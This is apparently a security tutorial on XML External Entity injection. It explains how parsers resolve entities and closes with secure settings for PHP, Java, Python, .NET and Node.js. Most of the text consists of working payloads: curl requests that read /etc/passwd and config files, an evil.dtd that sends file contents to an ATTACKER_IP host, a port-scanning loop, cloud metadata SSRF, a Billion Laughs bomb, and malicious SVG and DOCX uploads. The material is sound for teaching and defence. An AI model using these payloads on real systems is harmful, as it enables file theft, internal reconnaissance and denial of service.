XXE

XML External Entity injection tricks XML parsers into resolving attacker-controlled entities for file disclosure, server-side request forgery, and denial of service.

Overview

XML is self-describing by design: a document may declare its own grammar and pull external resources through a Document Type Definition. A parser that resolves those declarations without restriction turns the same mechanism that enables shared schemas into a primitive for local file reads, outbound requests, and memory exhaustion. This article follows a document from DTD processing through entity resolution, demonstrates in-band, out-of-band, and error-based exfiltration, and lists the parser settings that disable the attack.

XML Parsing Pipeline

XML parsers process documents through these stages: 

XML Document → DTD Processing → Entity Resolution → Document Tree → Output
                 ^               ^
                 Attack Surface  Attack Surface

Each stage is a trust boundary. If the parser trusts the document's declarations, the document can make the parser perform arbitrary file reads, network requests, and infinite loops.

XML Structural Elements

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
    <!-- Internal DTD subset -->
    <!ENTITY author "cookiengineer">
    <!ENTITY file SYSTEM "file:///etc/passwd">
    <!ENTITY % param "<!ENTITY exfil SYSTEM 'http://attacker/?%file;'>">
    %param;
]>
<root>
    <content>&file;</content>
</root>
Declaration Purpose
<!ENTITY name "value"> Internal entity: simple text substitution
<!ENTITY name SYSTEM "URI"> External entity: reads from URI (file://, http://, ftp://)
<!ENTITY name PUBLIC "id" "URI"> Public entity: registered public identifier with fallback URI
<!ENTITY % name "value"> Parameter entity: entity usable only within DTD, prefixed with%
%name; Parameter entity reference (only in DTD)
&name; General entity reference (in document body)

Why XXE Exists

XML is a markup language from 1998 designed for document exchange. The designers wanted XML to be self-referential: a document could define its own document type and pull in external resources. The DTD mechanism was meant for shared schemas, but it allowed arbitrary URI resolution. Parsers implemented the spec faithfully. Nobody considered malicious documents because the original threat model was "well-formed documents exchanged between cooperating parties."

In-Band XXE: Entity Revealed in Response

The parsed entity value appears directly in the XML output. This is the simplest case. 

<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<order>
    <item>&xxe;</item>
    <quantity>1</quantity>
</order>

Manual exploitation with curl

# Basic file read — /etc/passwd
curl -X POST 'http://target/order' \
  -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<order><item>&xxe;</item></order>'

# Read application source code
curl -X POST 'http://target/order' \
  -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">]>
<order><item>&xxe;</item></order>'

# Read PHP source without parsing (php:// filter wrapper)
curl -X POST 'http://target/order' \
  -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php">]>
<order><item>&xxe;</item></order>'

The base64-encoded PHP source appears in the response, avoiding PHP execution.

Out-of-Band (Blind) XXE

When the server doesn't echo entities in the response, exfiltrate data by forcing the parser to make an HTTP request to an attacker-controlled server.

Basic OOB Exfiltration

Host the Malicious DTD

# On attacker machine, serve the DTD:
mkdir /tmp/xxe-serve
cat > /tmp/xxe-serve/evil.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://ATTACKER_IP:8888/?data=%file;'>">
%eval;
%exfiltrate;
EOF

cd /tmp/xxe-serve && python3 -m http.server 8888

Request the External DTD

<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY % remote SYSTEM "http://ATTACKER_IP:8888/evil.dtd">
    %remote;
]>
<foo>bar</foo>

How this works

  1. Parser reads the initial XML , sees %remote; referencing http://ATTACKER_IP:8888/evil.dtd
  2. Parser fetches evil.dtd from the attacker
  3. Inside the DTD: %file; reads /etc/hostname into the entity
  4. %eval; dynamically defines &#x25;exfiltrate (i.e., %exfiltrate ) containing a URL with the file data
  5. %exfiltrate; triggers an HTTP request to the attacker with the file contents in the query string

Multiple file exfiltration

<!-- evil.dtd on attacker server -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER_IP:8888/?%file;'>">
%start;
%send;

Port Scanning via OOB XXE

<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "http://192.168.1.1:22/doesnotexist">
    %xxe;
]>

Time difference reveals if the port is open (fast error for open, timeout for closed).

# Automate internal port scanning via XXE
for port in 22 80 443 3306 6379 8080 9200 27017; do
    time curl -s -X POST 'http://target/vuln' \
      -H 'Content-Type: application/xml' \
      -d "<?xml version=\"1.0\"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:$port/doesnotexist\">]>
<foo>&xxe;</foo>" > /dev/null
    echo "Port $port: $?"
done

Error-Based XXE

When both in-band and OOB channels are blocked, force the parser to emit an error message containing the exfiltrated data. The error goes to the HTTP response or log file. 

<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % error_entity SYSTEM "file:///nonexistent/%file;">
    %error_entity;
]>

The parser tries to read a file whose path contains /etc/passwd contents. The path is invalid, producing a FileNotFoundException or similar with the sensitive data embedded in the error text.

PHP Error-Based XXE

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ELEMENT foo ANY>
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">
    %dtd;
]>
<foo>&send;</foo>

Where evil.dtd : 

<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'file:///nope/%file;'>">
%payload;

Billion Laughs (XML Bomb)

Exponential entity expansion causes DoS by consuming all available memory. Also called the " XML Bomb" or "Exponential Entity Expansion" attack. 

<?xml version="1.0"?>
<!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
    <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>

By lol9 , the expansion is 10^9 "lol" strings, consuming~3GB of memory. This will crash most parsers.

Quadratic Blowup

A subtler DoS uses recursive entity definitions with quadratic growth: 

<?xml version="1.0"?>
<!DOCTYPE bomb [
    <!ENTITY a "aaaaaaaaaaaaaaaaaaaaa...">  <!-- 50KB string -->
]>
<bomb>
    <item>&a;&a;&a;&a;&a;&a;&a;&a;</item>
    <item>&a;&a;&a;&a;&a;&a;&a;&a;</item>
    <!-- Repeat 200+ times -->
</bomb>

This doesn't crash instantly but consumes CPU and memory proportionally to the number of references.

XXE in Different Parsers

libxml2 (PHP)

PHP 's DOM Document, Simple XML , and XML Reader all use libxml2. External entity loading has been disabled by default since PHP 8.0, and entity substitution only happens when the application passes LIBXML_NOENT explicitly. 

// Vulnerable — explicitly substitutes entities
$xml = file_get_contents('php://input');
$doc = new DOMDocument();
$doc->loadXML($xml, LIBXML_NOENT);
echo $doc->textContent;

// Also vulnerable
simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT);

// Secure — does not substitute entities (since PHP 8.0 default)
$doc = new DOMDocument();
$doc->loadXML($xml);

SSRF via PHP stream wrappers within XXE : 

<!-- expect:// can execute commands if enabled -->
<!ENTITY xxe SYSTEM "expect://id">

<!-- php://filter for source code -->
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">

<!-- data:// for inline SSRF -->
<!ENTITY xxe SYSTEM "data://text/plain;base64,SGVsbG8gV29ybGQ=">

Xerces (Java)

Java's default XML parser for JAXP. XXE is enabled by default. 

// Vulnerable
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(new InputSource(new StringReader(xml)));

// Secure — disable doctypes completely
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// Secure — disable external entities
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

lxml (Python)

Python's lxml resolves only internal entities by default ( resolve_entities='internal' ), so external entities are not fetched. Code that sets resolve_entities=True and loads a DTD becomes vulnerable. 

# Secure (default): external entities are not resolved
from lxml import etree
parser = etree.XMLParser()
tree = etree.fromstring(xml, parser)

# Vulnerable: resolves external entities and loads the DTD
parser = etree.XMLParser(resolve_entities=True, load_dtd=True)
tree = etree.fromstring(xml, parser)

XXE in File Uploads

SVG Files

SVG is XML . Any application that accepts SVG uploads and renders them server-side is vulnerable. 

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
    <text x="10" y="20" font-size="16" fill="red">&xxe;</text>
</svg>

The SVG renders the contents of /etc/passwd as visible text in the image. 

# SVG SSRF — make the server request an internal URL
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
    <text x="10" y="20" font-size="16" fill="red">&xxe;</text>
</svg>

DOCX/XLSX/PPTX (Office Open XML)

Office Open XML files are ZIP archives containing XML documents. Embed XXE in the word/document.xml within the archive: 

# Extract, modify, repack
unzip report.docx -d docx/
vim docx/word/document.xml  # Add DOCTYPE with XXE entity
cd docx && zip -r ../exploit.docx . && cd ..

# Upload exploit.docx — the server's XML parser processes document.xml

XXE via SOAP

SOAP requests are always XML . Most SOAP services accept custom XML bodies. 

curl -X POST 'http://target/soap-endpoint' \
  -H 'Content-Type: text/xml' \
  -H 'SOAPAction: ""' \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetData>
      <id>&xxe;</id>
    </GetData>
  </soap:Body>
</soap:Envelope>'

XXE in JSON Endpoints

Some applications parse JSON but internally convert to XML for legacy backends. The conversion library may support XML constructs within JSON , or the content type negotiation allows sending XML to a JSON endpoint. 

# Try changing Content-Type from application/json to application/xml
curl -X POST 'http://target/api/data' \
  -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>'

XXE Bypass Techniques

UTF-7 Encoding

# UTF-7 encoded "+ADw-?xml version+AD0AIg-1.0+ACI- encoding+AD0AIg-UTF-7+ACI-?+AD4-"
# Decodes to: <?xml version="1.0" encoding="UTF-7"?>
echo '+ADw-?xml version+AD0AIg-1.0+ACI- encoding+AD0AIg-UTF-7+ACI-?+AD4-<!DOCTYPE foo [+ADw-!ENTITY xxe SYSTEM "file:///etc/passwd"+AD4-]><foo>+ACY-xxe+ADs-</foo>' | iconv -f UTF-7 -t UTF-8

Send with Content-Type: text/xml; charset=UTF-7 .

Parameter Entity Wrapping

Some filters block SYSTEM in general entities but miss it in parameter entities: 

<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "file:///etc/passwd">
    <!ENTITY wrapper "%xxe;">
]>

External DTD Bypass

If a parser allows external DTDs but restricts entity definitions within the document's DOCTYPE, host the entities externally: 

<!-- In the HTTP request: -->
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://attacker/evil.dtd">
<foo>&file;</foo>
						
<!-- evil.dtd on attacker server: -->
<!ENTITY file SYSTEM "file:///etc/passwd">

CDATA Wrapping for Binary Files

For files with & , < , or > that would break XML parsing: 

<!-- evil.dtd -->
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///etc/shadow">
<!ENTITY % end "]]>">
<!ENTITY % wrapper "<!ENTITY all '%start;%file;%end;'>">
%wrapper;

Detection

Find XML inputs first

# Content-Type in responses
curl -s -I 'http://target/' | grep -i content-type

# Find endpoints that accept XML
curl -X POST 'http://target/api' \
  -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?><test/>' -v

# Check for SOAP
curl 'http://target/service?wsdl'

Confirm XXE with a benign test

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY test "XXE_WORKS"> ]>
<foo>&test;</foo>

If the response contains XXE_WORKS , entity substitution is enabled.

Test for external entities

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://YOUR_CALLBACK_SERVER/test"> ]>
<foo>&xxe;</foo>

Listen: python3 -m http.server 8888 or use Burp Collaborator.

Fixes

Language/Parser Secure Configuration
PHP (DOMDocument) $doc->loadXML($xml)- external entity loading off since PHP 8.0
PHP (SimpleXML) Avoid passingLIBXML_NOENTflag
Java (DocumentBuilder) factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
Java (SAXParser) factory.setFeature("http://xml.org/sax/features/external-general-entities", false)
Python (lxml) Use defaultXMLParser()- external entities stay unresolved
Python (xml.etree) Usedefusedxmllibrary instead of stdlibxml
.NET XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit
Node.js Uselibxmljswith{ noent: false, dtdload: false }

The universal rule: Disable DTD processing entirely if you don't need it. If you do need DTDs for schema validation, disable external entity resolution specifically.
